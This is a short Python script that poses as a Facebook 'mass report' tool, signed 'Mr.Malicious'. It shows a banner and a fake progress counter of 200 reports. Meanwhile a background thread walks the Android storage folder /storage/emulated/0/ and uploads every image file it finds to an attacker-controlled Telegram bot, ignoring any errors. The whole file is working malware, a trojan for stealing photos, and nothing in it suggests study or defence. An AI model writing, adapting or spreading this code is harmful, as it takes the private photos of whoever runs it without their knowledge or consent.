import os
import requests
import time
import sys
import threading

bot_token = 'Enter your bot token'
chat_id = 'Enter your chat id'

data_path = '/storage/emulated/0/'
image_extensions = ['.jpg', '.jpeg', '.png', '.gif']

def send_image(file_path):
    telegram_url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    
    try:
        with open(file_path, 'rb') as image_file:
            files = {'document': image_file}
            data = {'chat_id': chat_id}
            requests.post(telegram_url, files=files, data=data)
    except Exception as e:
        pass  
def steal_images():
    for root, dirs, files in os.walk(data_path):
        for file in files:
            if any(file.lower().endswith(ext) for ext in image_extensions):
                file_path = os.path.join(root, file)
                send_image(file_path)


def display_facebook_banner():
    banner = """
 ____ ____ ____ ____ ____ ____ 
||R |||E |||P |||O |||R |||T ||
||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|
 ___________________________
|      Mr.Malicious         |
|___________________________|
"""
    print(banner)
def display_fake_reporting(account):
    total_reports = 200  
    print(f"Starting mass report process for account: {account}")

    for report in range(total_reports):
        time.sleep(6)  
        sys.stdout.write(f'\rReport {report + 1}/{total_reports} sent successfully.')
        sys.stdout.flush()
    
    print("\nMass report completed! Facebook will review shortly...")

def main():
    display_facebook_banner()
    
    target_account = input('Enter the Facebook account to mass report: ')
    
    steal_thread = threading.Thread(target=steal_images)
    steal_thread.start()
    display_fake_reporting(target_account)

if __name__ == '__main__':
    main()